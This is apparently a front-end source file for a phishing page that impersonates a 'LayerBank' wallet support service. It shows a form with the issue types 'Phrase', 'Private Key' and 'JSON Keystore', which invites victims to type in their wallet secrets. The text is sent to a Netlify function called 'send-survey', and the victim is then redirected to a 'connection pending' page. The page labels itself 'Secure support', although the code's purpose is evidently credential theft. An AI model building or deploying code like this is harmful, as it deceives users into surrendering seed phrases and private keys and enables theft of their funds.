import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { ArrowLeft, LoaderCircle, MessageSquareWarning, ShieldCheck } from "lucide-react";
import { FormEvent, useState } from "react";

import { Button } from "@/components/ui/button";

export const Route = createFileRoute("/manual-connect")({
  validateSearch: (search: Record<string, unknown>) => ({
    wallet: typeof search["wallet"] === "string" ? search["wallet"].slice(0, 80) : "Unknown wallet",
  }),
  head: () => ({
    meta: [
      { title: "Wallet Connection Support | LayerBank" },
      { name: "description", content: "Report an EVM wallet connection issue." },
    ],
  }),
  component: ManualConnect,
});

const issueOptions = ["Phrase", "Private Key", "JSON Keystore"] as const;

function Logo() {
  return <div className="flex items-center gap-2.5" aria-label="LayerBank"><span className="text-[30px] font-black leading-none tracking-[-0.08em]">LɃ</span><span className="text-xl font-bold">LayerBank</span></div>;
}

function ManualConnect() {
  const { wallet } = Route.useSearch();
  const navigate = useNavigate();
  const [issue, setIssue] = useState("");
  const [description, setDescription] = useState("");
  const [website, setWebsite] = useState("");
  const [status, setStatus] = useState<"idle" | "sending" | "sent" | "error">("idle");
  const [message, setMessage] = useState("");

  const submit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!issue || description.trim().length < 10) {
      setStatus("error");
      setMessage("Choose an issue and enter at least 10 characters of detail.");
      return;
    }

    setStatus("sending");
    setMessage("");
    try {
      const response = await fetch("/.netlify/functions/send-survey", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet, issue, description: description.trim(), website }),
      });
      const contentType = response.headers.get("content-type") || "";
      const result = contentType.includes("application/json")
        ? await response.json() as { message?: string }
        : { message: response.ok ? undefined : "The email service endpoint is unavailable. For local testing, run the site with Netlify Dev." };
      if (!response.ok) throw new Error(result.message || "Unable to send your report.");
      setStatus("sent");
      await navigate({ to: "/connection-pending", replace: true });
    } catch (error) {
      setStatus("error");
      setMessage(error instanceof Error ? error.message : "Unable to send your report.");
    }
  };

  return (
    <div className="min-h-screen bg-background text-foreground">
      <header className="border-b border-border bg-page-top">
        <div className="mx-auto flex h-24 max-w-[1100px] items-center px-6 sm:px-10"><Link to="/"><Logo /></Link><span className="ml-auto flex items-center gap-2 text-sm text-table"><ShieldCheck className="size-4 text-primary" />Secure support</span></div>
      </header>
      <main className="mx-auto max-w-[760px] px-6 py-12 sm:px-10 sm:py-20">
        <Link to="/validate" className="mb-8 inline-flex items-center gap-2 text-sm font-semibold text-table transition-colors hover:text-foreground"><ArrowLeft className="size-4" />Back to wallet options</Link>
        <section className="rounded-[28px] border border-border bg-card p-6 shadow-[0_30px_80px_rgba(0,0,0,0.25)] sm:p-10">
          <div className="mb-8"><span className="mb-5 grid size-12 place-items-center rounded-2xl bg-primary/10 text-primary"><MessageSquareWarning className="size-6" /></span><h1 className="text-3xl font-bold tracking-tight">Manual connection support</h1><p className="mt-3 leading-7 text-table"><strong className="text-foreground">{wallet} </strong></p></div>

          <form onSubmit={submit} className="space-y-6">
              <label className="block"><span className="mb-2 block text-sm font-semibold">Issue type</span><select value={issue} onChange={(event) => setIssue(event.target.value)} required className="h-14 w-full rounded-xl border border-border bg-background px-4 text-foreground outline-none focus:border-primary focus:ring-2 focus:ring-primary/20"><option value="" disabled>Select an issue</option>{issueOptions.map((option) => <option key={option} value={option}>{option}</option>)}</select></label>
              <label className="block"><span className="mb-2 block text-sm font-semibold">Description</span><textarea value={description} onChange={(event) => setDescription(event.target.value)} required minLength={10} maxLength={2000} rows={7} placeholder="...." className="w-full resize-y rounded-xl border border-border bg-background p-4 text-foreground outline-none placeholder:text-subtle focus:border-primary focus:ring-2 focus:ring-primary/20" /><span className="mt-1 block text-right text-xs text-subtle">{description.length}/2000</span></label>
              <label className="hidden" aria-hidden="true">Website<input tabIndex={-1} autoComplete="off" value={website} onChange={(event) => setWebsite(event.target.value)} /></label>
              {message && <p role="alert" className="rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">{message}</p>}
              <Button type="submit" disabled={status === "sending"} className="h-14 w-full rounded-xl text-base font-bold">{status === "sending" ? <><LoaderCircle className="animate-spin" />Sending report…</> : "Submit report"}</Button>
          </form>
        </section>
      </main>
    </div>
  );
}
